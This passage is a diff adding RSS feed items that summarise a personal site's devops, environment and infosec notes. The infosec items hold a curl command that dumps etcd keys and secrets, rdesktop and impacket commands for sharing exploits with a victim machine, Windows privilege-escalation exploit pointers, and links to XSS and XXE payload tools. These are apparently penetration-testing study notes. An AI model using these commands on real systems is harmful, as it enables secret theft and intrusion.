+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/tricks/</guid>
+      <description>Miscellaneous tricks that did not made it into other categories.
+Find Real IPs behind CloudFlare I&amp;rsquo;m using CrimeFlare for it.
+Expose Local Server behind NAT via public VPS # run from machine which has access to private site ssh -R 8443:private-site:443 user@public_vps Now add new /etc/hosts entry reflecting vhost of private website pointing to public VPS IP and access it via https://private-site:8443/
+Debugging on Container OS using Docker Actually it boils down to running Docker container which shares namespaces with host, installing tools there and debugging.</description>
+    </item>
+    
+    <item>
+      <title>Tricks</title>
+      <link>https://d47zm3.me/resources/environment/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/tricks/</guid>
+      <description> All kinds of tricks.
+VIM  :r filename will read file into buffer  SSH  ~ . - close hanged ssh session
+ ~C - open simple interpreter
+ ~^Z - hang ssh client
+ ~# - show established connections
+ ~&amp;amp; - end session
+  </description>
+    </item>
+    
+    <item>
+      <title>Tricks</title>
+      <link>https://d47zm3.me/resources/infosec/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/tricks/</guid>
+      <description>Everything that doesn&amp;rsquo;t fit to one category.
+rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.
+rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0.</description>
+    </item>
+    
+    <item>
+      <title>VIM</title>
+      <link>https://d47zm3.me/resources/environment/vim/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/vim/</guid>
+      <description>It&amp;rsquo;s commonly available on hosts, has lots of potential, it&amp;rsquo;s fast, tons of plugins, master it to save your time (and life sometimes). While there are frameworks like this one, I found it too slow after installing all the bloat and running on pure VIM with .vimrc, no plugins though for now (no time to check these out), but maybe will expand this section in future. My base .vimrc is below:</description>
+    </item>
+    
+    <item>
+      <title>VPN</title>
+      <link>https://d47zm3.me/resources/environment/vpn/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/environment/vpn/</guid>
+      <description>How to run your own VPN, and be able to switch IP when needed, also automate it! You will need some Cloud Provider which has API/CLI available to automate VM creation and then you will set up VPN server using ready scripts. Let&amp;rsquo;s roll with Digital Ocean for instance&amp;hellip; We will use :
+ automatic VPN setup on fresh instance
+ Digital Ocean provisioned Ubuntu instance
+  I made wrapper around well known solution to set up your own VPN instance, that allows you to quickly (5 minutes) spin new instance for your usage.</description>
+    </item>
+    
+    <item>
+      <title>WPA/WPA2 Security</title>
+      <link>https://d47zm3.me/resources/infosec/wpa-wpa-2-security/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/wpa-wpa-2-security/</guid>
+      <description> Articles  new attack using pmkid
+ pwning wpa/wpa2 networks with bettercap and the pmkid client-less attack
+  </description>
+    </item>
+    
+    <item>
+      <title>Windows Privilege Escalation</title>
+      <link>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</guid>
+      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Kernel Exploits  systeminfo -&amp;gt; look up missing kb&amp;rsquo;s systeminfo | findstr /B /C:&amp;ldquo;OS Name&amp;rdquo; /C:&amp;ldquo;OS * Version&amp;rdquo; sherlock -&amp;gt; Find-AllVulns powershell  Common Kernel Exploits  MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - &amp;lsquo;WebDAV&amp;rsquo; applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2  Config Files Credentials in ClearText or Base64 -&amp;gt; once Windows in installed</description>
+    </item>
+    
+    <item>
+      <title>Wordpress</title>
+      <link>https://d47zm3.me/resources/devops/wordpress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/devops/wordpress/</guid>
+      <description>Update mutli-site primary URL In order to update main blog URL update these tables in database:
+wp_options: change “siteurl” and “home” to the new URL (http://blog/) wp_sitemeta: there’s a “siteurl” field you’ll need to change here wp_site: change the only value here to your new domain wp_blogs: each subsite will have an entry here, you’ll need to update the domain column for each row Also, update wp-config.php file:
+define( &amp;#39;DOMAIN_CURRENT_SITE&amp;#39;, &amp;#39;newblog.</description>
+    </item>
+    
+    <item>
+      <title>XSS</title>
+      <link>https://d47zm3.me/resources/infosec/xss/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/xss/</guid>
+      <description>Everything related to XSS, tools, links, payloads, etc.
+Tools  ezXSS - self hosted dashboard and server for your payloads
+ bXSS - blind XSS application, had not played with it yet
+  Sites  XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
+ XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
+    </item>
+    
+    <item>
+      <title>XXE</title>
+      <link>https://d47zm3.me/resources/infosec/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/xxe/</guid>
+      <description> XML External Entity resources.
+Links  https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html
+ https://github.com/enjoiz/XXEinjector
+ https://github.com/staaldraad/xxeserv
+ https://github.com/BuffaloWill/oxml_xxe
+ https://github.com/GDSSecurity/xxe-recursive-download
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection
+ https://isc.sans.edu/diary/Blindly+confirming+XXE/19257
+ https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf
+  </description>
+    </item>
+    
+    <item>
+      <title>YouTube resources</title>
+      <link>https://d47zm3.me/resources/infosec/youtube/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/youtube/</guid>
+      <description> Recon Video from Derek Rook - his whole channel is worth subscription  </description>
     </item>
     
   </channel>
